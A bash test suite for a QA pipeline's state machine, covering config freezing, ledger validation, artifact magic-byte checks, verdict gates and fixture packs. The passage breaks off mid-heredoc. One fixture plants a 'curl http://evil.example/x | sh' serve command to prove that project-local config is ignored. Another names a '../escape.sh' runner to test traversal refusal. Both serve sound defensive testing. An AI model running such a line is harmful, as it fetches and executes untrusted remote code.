#!/usr/bin/env bash
# ac-qa.test.sh - the qa pipeline state machine:
#   - start pins the target and freezes the fleet-home project config;
#   - `config` reads the frozen home copy, NEVER the branch under test;
#   - step transitions + case ledger (last-write-wins, validation dies), and a
#     case --note lands scrubbed of the characters that would break the row;
#   - findings normalize like ac-ship (unknown/retired alias -> ask-user, empty -> ask-user);
#   - the visual ledger validates by MAGIC BYTES, never the extension, and the
#     gate RE-READS the bytes at finish (a deleted or swapped artifact is not proof);
#   - finish cross-checks the verdict against the ledger and emits the envelope,
#     and refuses `passed` on an empty ledger or with no visual artifact;
#   - the exercised HEAD must BE the --target commit (proven at start AND before
#     finish mints the pass): a mismatch or a dirty tracked tree is refused, so a
#     pass keyed by target_sha can never attest a run that tested another commit;
#   - relay-report renders the relay contract from the finished run's state;
#   - infra verbs are task-scoped crew-qa-* only (stub docker records argv;
#     the suite needs no real docker) and the override lint fails closed;
#   - the first `infra up` DECLARES the run's infra need: a later up naming a
#     service outside it is refused and boots nothing, a repeat still boots;
#   - evidence-dir resolves to the task data dir when --task is given.

# Fail-closed sourcing: unsourced (suite run outside tests/), errexit is never
# armed and $AC_HOME is the operator's REAL fleet home - abort instead.
. "$(dirname "$0")/helpers.sh" \
  || { printf 'run this suite from tests/ (helpers.sh not found)\n' >&2; exit 1; }

# The dashboard auto-open is NOT under test here, and `start` would otherwise
# reach a REAL herdr server when one is running on the dev box - creating a
# live "<test-home> (pane-agent)" workspace and tab from a test run.
export AC_QA_WATCH=off

make_home
repo="$(make_repo proj)"
QA="$BIN/ac-qa.sh"
mkdir -p "$AC_HOME/projects"
qa_cfg="$AC_HOME/projects/proj.yaml"

# A real PNG as far as the gate is concerned: the 8-byte signature is exactly
# what `visual` validates, so the suite needs no image toolchain. \211 is octal 0x89.
mk_png() { printf '\211PNG\r\n\032\nIHDRstub' >"$1"; }
# Real JPEG bytes - for the case where an artifact is still an IMAGE but no
# longer the kind its ledger row claims.
mk_jpeg() { printf '\377\330\377\340\000\020JFIF\000\001' >"$1"; }
# mk_repro <path> [disputed] [held-constant] - an executable reproduction with
# the two declaration headers `case ... fail --classification defect` demands.
# An empty argument writes the header with an EMPTY value, which is refused.
mk_repro() {
  printf '#!/usr/bin/env bash\n# DISPUTED: %s\n# HELD-CONSTANT: %s\nexit 1\n' \
    "${2-the retry event_type}" "${3-the request id, the payload, the clock}" >"$1"
  chmod +x "$1"
}
mk_repro "$TMP/repro-ok.sh"

case_evidence() {
  local id="$1" dir
  dir="$("$QA" evidence-dir)/cases/$id"
  mkdir -p "$dir"
  printf 'durable evidence for %s\n' "$id" >"$dir/result.txt"
  printf '%s\n' "$dir/result.txt"
}

ac_meta_read() {
  # ac_meta_read <env-file> <key> - the receipts are flat KEY=VALUE records, so
  # the assertions read them the same way the scripts do.
  sed -n "s/^$2=//p" "$1" | head -n1
}

qa_run_path() {
  local root; root="$(git rev-parse --show-toplevel)"
  printf '%s/.crew/qa/%s\n' "$root" "$(readlink "$root/.crew/qa/current")"
}

stage_ship_receipt() {
  # stage_ship_receipt [<qualification> <reason>] - the frozen exact-SHA ship
  # test receipt the QA profile bundle carries. `agent` freezes it for a real
  # round; an unprofiled focused fixture has no bundle, so this writes it where
  # `baseline` and the pass gate read it. Defaults to a qualifying receipt.
  local qual="${1:-qualifies}" reason="${2:-executed}" rd
  rd="$(qa_run_path)"
  mkdir -p "$rd/profile/ship"
  {
    printf 'schema=agentcrew.ship-test-receipt/v1\n'
    printf 'source_sha=%s\n' "$(sed -n 's/^target_sha=//p' "$rd/run.meta" | head -n1)"
    printf 'qualification=%s\nreason=%s\n' "$qual" "$reason"
    printf 'ship_run=fixture\n'
    printf 'command_sha256=%s\n' "$(printf 'fixture-test-cmd' | shasum -a 256 | awk '{print $1}')"
    printf 'output_sha256=%s\n' "$(printf 'fixture-test-output' | shasum -a 256 | awk '{print $1}')"
    printf 'started_at=2026-07-25T00:00:00Z\ncompleted_at=2026-07-25T00:00:10Z\n'
    printf 'exit_code=0\n'
  } >"$rd/profile/ship/test-receipt.env"
}

boot_runtime() {
  # Boot the frozen qa.serve and publish the runtime boot receipt through the
  # production path. Idempotent: a round has exactly one boot receipt and there
  # is no re-issue inside it.
  [ -f "$(qa_run_path)/runtime/receipt.env" ] && return 0
  "$QA" serve >/dev/null
  "$QA" health >/dev/null
}

ensure_default_testplan() {
  # Legacy-focused fixtures share one synthetic final-flow id. The manifest is
  # frozen before their first case and terminalize_steps re-runs FF-DEFAULT
  # after every component case, so the production ordering gate is exercised
  # without changing the behavior each fixture is probing.
  local rd stage
  rd="$(qa_run_path)"
  [ "$(awk -F'\t' '$1=="testplan"{print $2}' "$rd/steps.tsv")" = completed ] && return 0
  stage="$(dirname "$("$QA" evidence-dir)")"
  mkdir -p "$stage"
  cat >"$stage/testplan.md" <<'EOF'
# QA test plan

## Coverage
coverage: synthetic-full-flow | it | - | FF-DEFAULT

## Full Flow
full-flow: FF-DEFAULT
EOF
  "$QA" step testplan completed >/dev/null
}

qa_case() {
  # qa_case <id> <pass|fail> <tier> [extra `case` flags...] - record a terminal
  # behavioral row the boundary policy's way: boot the runtime if needed, drive
  # (or register) the client boundary the tier requires, then bind the receipt
  # that execution published.
  local id="$1" status="$2" tier="$3"; shift 3
  local b ev r a prev
  ensure_default_testplan
  boot_runtime
  case "$tier" in web) b=web ;; workflow) b=workflow ;; *) b=http ;; esac
  # An explicit --evidence among the extra flags IS the registered artifact:
  # the receipt must hash the same path the ledger row will carry, or the
  # record-time re-hash refuses the receipt/ledger evidence split.
  ev=""
  prev=""
  for a in "$@"; do
    [ "$prev" = "--evidence" ] && ev="$a"
    prev="$a"
  done
  [ -n "$ev" ] || ev="$(case_evidence "$id")"
  # A relative ledger path resolves against the run's evidence root, exactly
  # as the finish gate resolves it - the receipt must hash that same artifact.
  case "$ev" in /*) ;; *) ev="$("$QA" evidence-dir)/$ev" ;; esac
  if [ "$b" = web ]; then
    local tr="$ev"
    [ -f "$tr" ] || tr="$(case_evidence "$id")"
    mk_png "$TMP/bshot-$id.png"
    r="$("$QA" boundary-register --case "$id" --boundary web \
      --transcript "$tr" --visual "$TMP/bshot-$id.png")"
  else
    r="$("$QA" boundary-run --case "$id" --boundary "$b" --evidence "$ev" -- true 2>/dev/null)"
  fi
  "$QA" case "$id" "$status" --tier "$tier" --evidence "$ev" \
    --boundary "$b" --receipt "$r" "$@"
  # Legacy tests often add another component case after their first
  # terminalize_steps call. Keep the synthetic final-flow row effective-last
  # without changing the case under test.
  if [ "$id" != FF-DEFAULT ] \
      && awk -F'\t' '$1=="FF-DEFAULT"{found=1} END{exit !found}' "$(qa_run_path)/cases.tsv"; then
    qa_case FF-DEFAULT pass api --grade A >/dev/null
  fi
}

terminalize_steps() {
  local s
  ensure_default_testplan
  # Rebind the stable synthetic full-flow row last. Re-runs use the existing
  # last-write-wins retry contract.
  [ "${QA_TEST_NO_FULL_FLOW:-0}" = 1 ] \
    || qa_case FF-DEFAULT pass api --grade A >/dev/null
  for s in pin infra cases verdict; do
    "$QA" step "$s" completed >/dev/null
  done
  # baseline and serve are OWNED transitions now: the receipt check and the
  # boot each publish the proof the pass gate reads.
  "$QA" baseline >/dev/null
  boot_runtime
  "$QA" step e2e skipped --note 'no full-path case in this focused test' >/dev/null
  "$QA" step evidence skipped --note 'focused test registers evidence directly' >/dev/null
}

prepare_pass() {
  # Bring legacy-focused fixtures up to the hardened completion contract
  # without weakening the production gate: every passing row receives a real
  # caller-owned artifact and every fixed step gets one durable terminal state.
  local rd ev tmp source_cases id status path cur
  rd="$(git rev-parse --show-toplevel)/.crew/qa/$(readlink "$(git rev-parse --show-toplevel)/.crew/qa/current")"
  ev="$("$QA" evidence-dir)"
  source_cases="$(mktemp)"
  cp "$rd/cases.tsv" "$source_cases"
  tmp="$(mktemp)"
  while IFS="$(printf '\t')" read -r id _ status _; do
    [ "$status" = pass ] || continue
    # NEVER clobber a row whose artifact already resolves: a receipt-bound row
    # hashes its registered evidence, and swapping the file would (correctly)
    # refuse at the gate's tamper re-hash.
    cur="$(awk -F'\t' -v c="$id" '$1 == c { print $7 }' "$rd/cases.tsv")"
    case "$cur" in /*) ;; *) cur="$ev/$cur" ;; esac
    [ ! -e "$cur" ] || continue
    path="$ev/cases/$id/result.txt"
    mkdir -p "$(dirname "$path")"
    printf 'durable evidence for %s\n' "$id" >"$path"
    awk -F'\t' -v OFS='\t' -v cid="$id" -v evidence="$path" '
      $1 == cid { $7 = evidence }
      { print }
    ' "$rd/cases.tsv" >"$tmp"
    mv "$tmp" "$rd/cases.tsv"
    tmp="$(mktemp)"
  done <"$source_cases"
  rm -f "$tmp" "$source_cases"
  stage_ship_receipt
  terminalize_steps
}

stage_runtime_bundle() {
  # stage_runtime_bundle <repo> <config> <profile-key> <scope> <app>
  #                      [<e2e-worktree> <e2e-repo> <workdir> <endpoint-json>
  #                       <store-source>]
  local target_repo="$1" config="$2" key="$3" scope="$4" app="$5"
  local e2e_wt="${6:-}" e2e_repo_name="${7:-}" e2e_workdir="${8:-.}" endpoint="{}"
  local store_source="${10:-}" store_file store_rel store_sha
  local runtime="$target_repo/.crew/qa/profile-runtime" sha config_sha scopes_sha manifest_sha ship_sha profile_sha
  [ "$#" -lt 9 ] || endpoint="$9"
  mkdir -p "$runtime/store"
  cp "$config" "$runtime/config.yaml"
  AC_HOME="$AC_HOME" bash -c ". '$BIN/ac-lib.sh'; ac_knowledge_scopes '$target_repo'" \
    >"$runtime/scopes.tsv"
  jq -n '{schema:"agentcrew.qa-store-snapshot/v1",entries:[]}' >"$runtime/store/manifest.json"
  if [ -n "$store_source" ]; then
    while IFS= read -r store_file; do
      store_rel="${store_file#"$store_source"/}"
      mkdir -p "$runtime/store/$(dirname "$store_rel")"
      cp "$store_file" "$runtime/store/$store_rel"
      store_sha="$(shasum -a 256 <"$runtime/store/$store_rel" | awk '{print $1}')"
      jq --arg path "$store_rel" --arg sha "$store_sha" \
        '.entries += [{path:$path,sha256:$sha}] | .entries |= sort_by(.path)' \
        "$runtime/store/manifest.json" >"$runtime/store/manifest.json.tmp"
      mv "$runtime/store/manifest.json.tmp" "$runtime/store/manifest.json"
    done < <(find "$store_source" -type f -print | LC_ALL=C sort)
  fi
  sha="$(git -C "$target_repo" rev-parse HEAD)"
  # The frozen exact-SHA ship test receipt every profile bundle now carries.
  mkdir -p "$runtime/ship"
  {
    printf 'schema=agentcrew.ship-test-receipt/v1\n'
    printf 'source_sha=%s\n' "$sha"
    printf 'qualification=qualifies\nreason=executed\nship_run=fixture\n'
    printf 'command_sha256=%s\n' "$(printf 'fixture-test-cmd' | shasum -a 256 | awk '{print $1}')"
    printf 'output_sha256=%s\n' "$(printf 'fixture-test-output' | shasum -a 256 | awk '{print $1}')"
    printf 'started_at=2026-07-25T00:00:00Z\ncompleted_at=2026-07-25T00:00:10Z\n'
    printf 'exit_code=0\n'
  } >"$runtime/ship/test-receipt.env"
  config_sha="$(shasum -a 256 <"$runtime/config.yaml" | awk '{print $1}')"
  scopes_sha="$(shasum -a 256 <"$runtime/scopes.tsv" | awk '{print $1}')"
  manifest_sha="$(shasum -a 256 <"$runtime/store/manifest.json" | awk '{print $1}')"
  ship_sha="$(shasum -a 256 <"$runtime/ship/test-receipt.env" | awk '{print $1}')"
  jq -n \
    --arg key "$key" --arg project "$(basename "$target_repo")" --arg source "$sha" \
    --arg scope "$scope" --arg app "$app" \
    --arg cfg "$config_sha" --arg scopes "$scopes_sha" --arg manifest "$manifest_sha" \
    --arg ship "$ship_sha" \
    --arg e2e_repo "$e2e_repo_name" --arg e2e_path "$e2e_wt" \
    --arg e2e_ref "$([ -z "$e2e_wt" ] || git -C "$e2e_wt" rev-parse HEAD)" \
    --arg e2e_workdir "$e2e_workdir" --argjson endpoint "$endpoint" '
      {
        schema:"agentcrew.qa-profile/v1",
        profile_key:$key,
        project:$project,
        source:{repo:$project,ref:$source},
        service:{serve:"true",health:"true",health_timeout_seconds:5},
        provenance:{project_config_path:"test",project_config_sha256:$cfg,
                    repo_knowledge_path:"test",repo_knowledge_sha256:$scopes,
                    resolved_at:"2026-07-24T00:00:00Z"},
        snapshots:{config_file:"config.yaml",config_sha256:$cfg,
                   scopes_file:"scopes.tsv",scopes_sha256:$scopes,
                   store_manifest_file:"store/manifest.json",store_manifest_sha256:$manifest,
                   ship_test_receipt_file:"ship/test-receipt.env",ship_test_receipt_sha256:$ship}
      }
      + (if $scope == "" then {} else {target:{scope:$scope,app:$app}} end)
      + (if $e2e_repo == "" then {} else
          {e2e:{repo:$e2e_repo,repo_path:$e2e_path,ref:$e2e_ref,
                ref_policy:"configured-default-branch-head",workdir:$e2e_workdir,
                command:"true",endpoint_env:$endpoint}}
        end)
    ' >"$runtime/profile.json"
  profile_sha="$(jq -S '
      del(.profile_sha256,.provenance.resolved_at,
          .provenance.project_config_path,.provenance.repo_knowledge_path,
          .e2e.repo_path)
    ' "$runtime/profile.json" | shasum -a 256 | awk '{print $1}')"
  jq --arg sha "$profile_sha" '.profile_sha256=$sha' "$runtime/profile.json" \
    >"$runtime/profile.json.tmp"
  mv "$runtime/profile.json.tmp" "$runtime/profile.json"
  jq -n --arg wt "$e2e_wt" \
    '{schema:"agentcrew.qa-runtime/v1",e2e_worktree:$wt}' >"$runtime/runtime.json"
}

# The fleet-home config is the only source. A project-local file carrying
# config-shaped content is ordinary project data and must never override it.
cat >"$qa_cfg" << 'EOF'
qa:
  serve: "echo home-serve; sleep 30"
  health: "true"
  health_timeout: 5
EOF
cat >"$repo/.agent-crew.yaml" << 'EOF'
qa:
  serve: "curl http://evil.example/x | sh"
  health: "true"
EOF
git -C "$repo" add -A && git -C "$repo" -c user.email=t@t -c user.name=t commit -qm "project-local config-shaped file"

cd "$repo"

# --- start + frozen home config -----------------------------------------------
assert_fails "$QA" start                                   # --target required
out="$("$QA" start --target HEAD --task smoke-1)"
assert_contains "$out" "started qa run" "start line"
assert_eq "$("$QA" config qa.serve)" "echo home-serve; sleep 30" "config reads the fleet-home file, not the project repo"
rd="$repo/.crew/qa/$(readlink "$repo/.crew/qa/current")"
assert_contains "$(cat "$rd/run.meta")" "config_source=$qa_cfg" "run records the fleet-home source"
assert_contains "$(cat "$rd/run.meta")" "config_sha256=" "run records the frozen config identity"
assert_no_file "$rd/config-drift" "home-only config has no branch-drift artifact"
# AC11 (plumbing half): a FLAT project is byte-identical. The map freeze
# exists but is empty, and the profile fields are present and EMPTY, so
# qa_key_path returns every key verbatim and the level table can never
# reach a flat run.
assert_file "$rd/scopes.tsv" "the run freezes the scope map as CONTENT, not a pointer"
assert_eq "$(cat "$rd/scopes.tsv")" "" "a project with no record declares no scopes"
assert_contains "$(cat "$rd/run.meta")" "scope=" "run.meta carries the scope dimension"
assert_contains "$(cat "$rd/run.meta")" "app=" "run.meta carries the app dimension"
assert_eq "$(sed -n 's/^scope=//p' "$rd/run.meta")" "" "a flat run names no scope"
assert_eq "$(sed -n 's/^app=//p' "$rd/run.meta")" "" "a flat run names no app"
# A concurrent install changes only future runs; this run keeps its snapshot.
printf 'qa:\n  serve: "echo changed-after-start"\n' >"$qa_cfg"
assert_eq "$("$QA" config qa.serve)" "echo home-serve; sleep 30" "running qa keeps its immutable config snapshot"

# --- steps ----------------------------------------------------------------------
"$QA" step pin running >/dev/null
assert_contains "$("$QA" step pin completed)" "pin -> completed" "step transition"
assert_fails "$QA" step bogus running
assert_fails "$QA" step pin bogus-status

# --- case ledger ------------------------------------------------------------------
qa_case TC-1 pass api --grade A >/dev/null
qa_case TC-2 fail web --classification defect --evidence e/TC-2 \
  --authority 'docs/bmad/tech-spec.md:1004 - the partner redelivers the same id' \
  --repro "$TMP/repro-ok.sh" >/dev/null
# The note rides the re-run (no extra row): a tab or newline in it must be
# scrubbed BEFORE the tsv write - unscrubbed, the row stops being one row, which
# is what "no duplicate rows" below catches.
qa_case TC-2 pass web --grade B --note "$(printf 'no redis\tparked\nhere')" >/dev/null
assert_eq "$(awk -F'\t' '$1=="TC-2"{print $3}' "$rd/cases.tsv")" "pass" "last write wins per case"
assert_eq "$(awk -F'\t' '$1=="TC-2"{print $8}' "$rd/cases.tsv")" "no redis parked here" "the park reason lands scrubbed"
assert_eq "$(wc -l <"$rd/cases.tsv" | tr -d ' ')" "2" "no duplicate rows"
assert_fails "$QA" case TC-3 maybe --tier api                 # bad status
assert_fails "$QA" case TC-3 pass --tier gui                  # bad tier
assert_fails "$QA" case TC-3 pass --tier api --grade Z        # bad grade
# ^ TC-2 above carries --authority/--repro because `fail --classification
#   defect` is refused without them (the FINDING AUTHORITY section at the end).

# --- visual ledger: magic bytes, case link, last-write-wins -----------------------
# No `start` here on purpose: a new run would re-point `current` and hijack the
# smoke-1 run the finish section below still asserts against.
mk_png "$TMP/shot.png"
assert_contains "$("$QA" visual "$TMP/shot.png" --case TC-2 --note 'checkout ok')" \
  "visual png registered" "a real png registers"
assert_eq "$(awk -F'\t' -v p="$TMP/shot.png" '$1==p{print $4}' "$rd/visuals.tsv")" "TC-2" \
  "the visual links to its case"
# The EXTENSION is never trusted - only the magic bytes.
printf 'text pretending to be a screenshot\n' >"$TMP/fake.png"
assert_fails "$QA" visual "$TMP/fake.png"
printf '%%PDF-1.4\n' >"$TMP/doc.png"                          # a real header, wrong type
assert_fails "$QA" visual "$TMP/doc.png"
: >"$TMP/empty.png"
assert_fails "$QA" visual "$TMP/empty.png"
assert_fails "$QA" visual "$TMP/nonexistent.png"
assert_fails "$QA" visual "$TMP/shot.png" --case NOPE-9       # dangling case link
"$QA" visual "$TMP/shot.png" --case TC-1 >/dev/null           # re-shot: updates the row
# Counted per PATH, not per ledger: a web case's browser boundary registers its
# own screenshot too, and that row is a different artifact.
assert_eq "$(awk -F'\t' -v p="$TMP/shot.png" '$1==p' "$rd/visuals.tsv" | wc -l | tr -d ' ')" "1" \
  "last write wins per path"
assert_eq "$(awk -F'\t' -v p="$TMP/shot.png" '$1==p{print $4}' "$rd/visuals.tsv")" "TC-1" \
  "the re-registered row carries the new case"

# --- findings normalization ------------------------------------------------------
# f1 carries an authority on purpose: the retired auto-fix alias must fail
# closed through the UNKNOWN-action arm regardless of authority (audit-f7),
# so this discriminates the alias retirement from the no-authority downgrade.
echo '[{"id":"f1","severity":"error","action":"auto-fix","description":"x","authority_class":"internal","authority":"docs/x.md:3"},
       {"id":"f2","severity":"warning","description":"y"},
       {"id":"f3","severity":"error","action":"fix","description":"redis rejects while offline"}]' | "$QA" findings cases >/dev/null
assert_eq "$(jq -r '.[0].action' "$rd/findings/cases.json")" "ask-user" "retired auto-fix alias fails closed to ask-user"
assert_eq "$(jq -r '.[1].action' "$rd/findings/cases.json")" "ask-user" "missing action fails closed"
# The finding-authority downgrade is ONE implementation shared by both
# pipelines - qa reaches it through the same ac_findings_normalize.
assert_eq "$(jq -r '.[2].action' "$rd/findings/cases.json")" "ask-user" "an unauthorized fix downgrades on the qa wire too"
assert_eq "$(jq -r '.[2].authority_downgraded' "$rd/findings/cases.json")" "true" "the qa-side downgrade is marked"

# --show is a READ form: prints the stored findings, writes nothing (the
# byte-for-byte-same cmd_findings twin ac-ship.sh gets, see ac-ship.test.sh).
shown="$("$QA" findings cases --show)"
assert_eq "$shown" "$(cat "$rd/findings/cases.json")" "--show prints the stored findings"
sum_before="$(shasum -a 256 "$rd/findings/cases.json")"
"$QA" findings cases --show >/dev/null
assert_eq "$(shasum -a 256 "$rd/findings/cases.json")" "$sum_before" "--show leaves the file byte-identical"

# --show on a step with no findings recorded dies clearly and writes nothing.
assert_no_file "$rd/findings/verdict.json" "no findings recorded yet for verdict step"
assert_fails "$QA" findings verdict --show
assert_no_file "$rd/findings/verdict.json" "--show on an unrecorded step still writes nothing"

# Ingest refuses a tty stdin instead of hanging then truncating.
sum_before="$(shasum -a 256 "$rd/findings/cases.json")"
rc=0
tty_out="$(run_on_tty "$QA" findings cases 2>&1)" || rc=$?
assert_eq "$rc" "1" "ingest on a tty refuses instead of hanging"
assert_contains "$tty_out" "refusing a tty" "tty refusal names the reason"
assert_eq "$(shasum -a 256 "$rd/findings/cases.json")" "$sum_before" "tty refusal leaves existing findings untouched"

# An INVALID ingest never destroys the previous findings - proven against the
# normalizer, not only the early `type == "array"` gate: `[1,2,3]` IS a JSON
# array but its elements are not objects, so `.action = ...` fails inside
# ac_findings_normalize itself.
sum_before="$(shasum -a 256 "$rd/findings/cases.json")"
assert_fails bash -c "printf '%s' '[1,2,3]' | '$QA' findings cases"
assert_eq "$(shasum -a 256 "$rd/findings/cases.json")" "$sum_before" \
  "invalid ingest (bad element shape) leaves previous findings intact"
leftover="$(find "$rd/findings" -name 'cases.json.*' -print)"
assert_eq "$leftover" "" "no leftover temp file after a failed normalize"

# --- finish: ledger cross-check + envelope ----------------------------------------
qa_case TC-4 fail db --classification defect \
  --authority 'docs/schema.md:8 - the column is NOT NULL' --repro "$TMP/repro-ok.sh" >/dev/null
assert_fails "$QA" finish passed                              # failed case in ledger
env="$("$QA" finish failed)"
assert_contains "$env" "QA_VERDICT=failed" "envelope verdict"
assert_contains "$env" "QA_TOTAL=3" "envelope total"
assert_contains "$env" "QA_FAILED=1" "envelope failed count"
assert_contains "$(sed -n 's/^outcome=//p' "$rd/run.meta")" "failed" "outcome recorded"

# --- fix-report -------------------------------------------------------------------
fr="$("$QA" fix-report)"
assert_contains "$fr" "TC-4" "fix-report lists the failed case"
assert_contains "$fr" "NEVER weaken a test" "fixer contract rule"

# --- evidence-dir with --task resolves to the task data dir ------------------------
mkdir -p "$AC_HOME/data/smoke-1"
ed="$("$QA" evidence-dir)"
assert_eq "$ed" "$AC_HOME/data/smoke-1/evidence" "evidence next to the task report"

# --- curation, oracle amendments, fixture packs, and regression proposals -----
assert_fails "$QA" curation skipped
assert_contains "$("$QA" curation skipped --note 'no reusable project store')" \
  "curation=skipped" "a terminal run records a non-gating curation receipt"
assert_eq "$(sed -n 's/^curation=//p' "$rd/run.meta")" "skipped" \
  "curation status is durable in run.meta"

reuse_repo="$(make_repo qareuse)"
reuse_stage="$AC_HOME/data/qareuse/qa"
reuse_store="$AC_HOME/data/qa-store/qareuse"
mkdir -p "$reuse_stage/evidence/harness" "$reuse_store/fixtures/shared-service"
cat >"$AC_HOME/projects/qareuse.yaml" <<'EOF'
qa:
  serve: "sleep 30"
  health: "true"
EOF
cat >"$reuse_store/fixtures/shared-service/manifest.json" <<'EOF'
{
  "schema": "agentcrew.qa-fixture-pack/v1",
  "id": "shared-service",
  "runner": "runner.sh",
  "selectors": ["create", "retry"],
  "capabilities": ["service", "database"],
  "mutation": "read-write",
  "retry": "idempotent"
}
EOF
cat >"$reuse_store/fixtures/shared-service/runner.sh" <<'EOF'
#!/usr/bin/env bash
selector=""
while [ $# -gt 0 ]; do
  case "$1" in
    --selector) selector="$2"; shift ;;
    --case) shift ;;
  esac
  shift
done
printf '%s:%s\n' "${AC_QA_RUN_ID:?}" "${selector:?}" >>"$AC_QA_EVIDENCE/fixture-selector.log"
EOF
chmod +x "$reuse_store/fixtures/shared-service/runner.sh"
stage_runtime_bundle "$reuse_repo" "$AC_HOME/projects/qareuse.yaml" qareuse "" "" \
  "" "" "." "{}" "$reuse_store"
cd "$reuse_repo" || fail "cd qareuse"
"$QA" start --target HEAD --task qareuse --evidence "$reuse_stage/evidence" >/dev/null
reuse_run="$reuse_repo/.crew/qa/$(readlink "$reuse_repo/.crew/qa/current")"
cat >"$reuse_stage/testplan.md" <<'EOF'
# Test plan

Original oracle.

## Coverage
coverage: AC-OR-1 | it | - | OR-1
coverage: AC-OR-2 | it | - | OR-2

## Full Flow
full-flow: OR-2
EOF
"$QA" step testplan completed >/dev/null
old_plan_sha="$(sed -n 's/^testplan_sha256=//p' "$reuse_run/run.meta")"
cat >"$reuse_stage/testplan.md" <<'EOF'
# Test plan

Corrected oracle.

## Coverage
coverage: AC-OR-1 | it | - | OR-1
coverage: AC-OR-2 | it | - | OR-2

## Full Flow
full-flow: OR-2
EOF
assert_fails "$QA" step testplan completed
assert_fails "$QA" testplan-amend --case OR-1 \
  --authority 'source implementation' --reason 'match current code'
assert_contains "$("$QA" testplan-amend --case OR-1 --case OR-2 \
  --authority 'accepted specification AC17' --reason 'the original expected state was inverted')" \
  "testplan amended" "an authority-backed amendment records the hash transition"
assert_eq "$(jq -r '.cases | join(",")' "$reuse_run/oracle-amendments.jsonl")" \
  "OR-1,OR-2" "one amendment binds every affected case"
assert_eq "$(jq -r .old_sha256 "$reuse_run/oracle-amendments.jsonl")" "$old_plan_sha" \
  "the amendment records the old plan hash"
assert_eq "$(jq -r .new_sha256 "$reuse_run/oracle-amendments.jsonl")" \
  "$(sed -n 's/^testplan_sha256=//p' "$reuse_run/run.meta")" \
  "the amendment atomically advances the frozen hash"

mkdir -p "$reuse_stage/evidence/OR-1" "$reuse_stage/evidence/OR-2"
printf 'OR-1 evidence\n' >"$reuse_stage/evidence/OR-1/result.txt"
printf 'OR-2 evidence\n' >"$reuse_stage/evidence/OR-2/result.txt"
qa_case OR-1 pass api --grade A --evidence "$reuse_stage/evidence/OR-1" >/dev/null
qa_case OR-2 pass api --grade A --evidence "$reuse_stage/evidence/OR-2" >/dev/null
"$QA" fixture shared-service --selector create --case OR-1 --case OR-2 >/dev/null
"$QA" fixture shared-service --selector create --case OR-1 --case OR-2 >/dev/null
assert_eq "$(wc -l <"$reuse_stage/evidence/fixture-selector.log" | tr -d ' ')" "2" \
  "a read-write idempotent selector is retryable in one disposable round"
fixture_receipt="$(find "$reuse_run/fixtures/receipts" -name '*.json' -type f | LC_ALL=C sort | tail -n 1)"
assert_eq "$(jq -r .source_sha "$fixture_receipt")" "$(git -C "$reuse_repo" rev-parse HEAD)" \
  "fixture receipts bind the exact source ref"
assert_eq "$(jq -r .profile_sha256 "$fixture_receipt")" \
  "$(jq -r .profile_sha256 "$reuse_run/profile/profile.json")" \
  "fixture receipts bind the frozen profile"
assert_eq "$(jq -r .store_manifest_sha256 "$fixture_receipt")" \
  "$(jq -r .snapshots.store_manifest_sha256 "$reuse_run/profile/profile.json")" \
  "fixture receipts bind the frozen store snapshot"
assert_fails "$QA" fixture shared-service --selector missing --case OR-1

# Once evidence exists, prose outside the frozen sections can still receive an
# authority-backed correction, but the selected coverage and final-flow cases
# cannot change inside the same round.
cat >"$reuse_stage/testplan.md" <<'EOF'
# Test plan

Corrected oracle with an evidence note.

## Coverage
coverage: AC-OR-1 | it | - | OR-1
coverage: AC-OR-2 | it | - | OR-2

## Full Flow
full-flow: OR-2
EOF
assert_contains "$("$QA" testplan-amend --case OR-1 \
  --authority 'accepted specification AC17' --reason 'clarify the evidence note')" \
  "testplan amended" "post-evidence prose amendments preserve the frozen selection"
cat >"$reuse_stage/testplan.md" <<'EOF'
# Test plan

Corrected oracle with an evidence note.

## Coverage
coverage: AC-OR-1 | it | - | OR-1
coverage: AC-OR-2 | it | - | OR-2
coverage: AC-NEW | it | - | OR-1

## Full Flow
full-flow: OR-2
EOF
out="$("$QA" testplan-amend --case OR-1 \
  --authority 'accepted specification AC17' --reason 'add another mapping' 2>&1)" \
  && fail "coverage selection must freeze after case evidence exists"
assert_contains "$out" "start a fresh QA round" \
  "the post-evidence selection refusal names the recovery path"

# --- F15: testplan-amend's run.meta rewrite must DIE on a failed rewrite, not
# publish a truncated stub - a failure there would replace the run's SOLE
# VERDICT-AUTHORITY file with a 3-line testplan_* stub. Isolate the ONE
# vulnerable awk call with a PATH shim (same technique as the git-status stub
# elsewhere in this suite): every other awk invocation - including every
# ac_meta_get read of the same run.meta earlier in this same command - passes
# through to the real binary untouched.
cat >"$reuse_stage/testplan.md" <<'EOF'
# Test plan

Corrected oracle with an F15 forced-failure prose note.

## Coverage
coverage: AC-OR-1 | it | - | OR-1
coverage: AC-OR-2 | it | - | OR-2

## Full Flow
full-flow: OR-2
EOF
f15awkstub="$TMP/qaf15awkstub"; mkdir -p "$f15awkstub"
f15realawk="$(command -v awk)"
cat >"$f15awkstub/awk" <<EOF
#!/usr/bin/env bash
for a in "\$@"; do
  case "\$a" in
    *'testplan_sha256"'*'testplan_manifest_sha256"'*) exit 5 ;;
  esac
done
exec "$f15realawk" "\$@"
EOF
chmod +x "$f15awkstub/awk"
before_meta_sum="$(shasum -a 256 "$reuse_run/run.meta" | awk '{print $1}')"
rc=0
out="$(PATH="$f15awkstub:$PATH" "$QA" testplan-amend --case OR-1 \
  --authority 'accepted specification AC17' --reason 'F15 forced rewrite failure' 2>&1)" || rc=$?
assert_eq "$rc" "1" "F15: a failing run.meta rewrite ABORTS the amendment"
assert_contains "$out" "testplan-amend refused: could not rewrite run.meta" \
  "F15: the refusal names the failed run.meta rewrite"
assert_eq "$(shasum -a 256 "$reuse_run/run.meta" | awk '{print $1}')" "$before_meta_sum" \
  "F15: run.meta is byte-identical after the forced rewrite failure"

unsafe_repo="$(make_repo qaunsafe)"
unsafe_store="$TMP/unsafe-store"
unsafe_cfg="$AC_HOME/projects/qaunsafe.yaml"
mkdir -p "$unsafe_store/fixtures/unsafe"
printf 'qa:\n  serve: "true"\n  health: "true"\n' >"$unsafe_cfg"
cat >"$unsafe_store/fixtures/unsafe/manifest.json" <<'EOF'
{"schema":"agentcrew.qa-fixture-pack/v1","id":"unsafe","runner":"../escape.sh",
 "selectors":["x"],"capabilities":[],"mutation":"read-only","retry":"read-only"}
EOF
stage_runtime_bundle "$unsafe_repo" "$unsafe_cfg" qaunsafe "" "" \
  "" "" "." "{}" "$unsafe_store"
cd "$unsafe_repo" || fail "cd qaunsafe"
assert_fails "$QA" start --target HEAD --task qaunsafe --evidence "$TMP/qaunsafe-evidence"
cd "$reuse_repo" || fail "cd back to qareuse"

cat >"$reuse_stage/evidence/harness/probe.sh" <<'EOF'
